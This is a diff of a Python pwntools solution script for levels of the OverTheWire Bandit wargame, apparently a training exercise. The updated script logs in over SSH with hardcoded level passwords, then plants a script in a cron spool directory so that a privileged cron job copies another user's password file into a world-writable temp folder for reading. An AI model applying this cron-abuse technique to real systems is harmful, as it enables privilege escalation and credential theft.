@@ -74,27 +74,44 @@ from pwn import *
 
 def main():
   shell = ssh(host='bandit.labs.overthewire.org',
-            user='bandit22',
-            password='Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI',
+            user='bandit23',
+            password='jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n',
             port=2220
        )
 
   
-  p = shell['cat /etc/cron.d/cronjob_bandit23']
+  p = shell['cat /etc/cron.d/cronjob_bandit24']
 
   bash_script = p.split('\n')[1].split()[-3]
   log.info('Found bash script: {}'.format(bash_script))
 
   p = shell['cat {}'.format(bash_script)]
 
-  hash_cmd = p.split('\n')[3].split('$(')[1][:-1]
-  log.info('Found hash command file: {}'.format(hash_cmd))
+  cronjob_script = p.split('\n')[3]
+  log.info('Found cronjob script: {}'.format(cronjob_script))
 
-  p = shell['cat /tmp/$({})'.format(hash_cmd.replace('$myname', 'bandit23'))]
+  tmp_dir = shell['mktemp -d']
+  log.info('Created temporary directory: {}'.format(tmp_dir))
+  shell['chmod 777 {}'.format(tmp_dir)]
 
-  print p
+  shell['printf "cat /etc/bandit_pass/bandit24 > {}/bandit24pass" > /var/spool/bandit24/my_script'.format(tmp_dir)]
+  shell['chmod +x /var/spool/bandit24/my_script']
+  log.info('Created script and updated permissions: {}'.format('/var/spool/bandit24/my_script'))
+
+  cur_time = shell['date']
+  secs = int(cur_time.split()[3].split(':')[-1])
+  wait_secs = 60 - secs
+
+  p = log.progress('Need to wait {} seconds'.format(wait_secs))
+  for i in range(wait_secs + 1, -1, -1):
+    time.sleep(1)
+    p.status('{} seconds more...'.format(i))
+  p.success('Done')
+  
+  password = shell['cat {}/bandit24pass'.format(tmp_dir)]
+
+  print password
 
 if __name__ == "__main__":
   main()
-
 ```
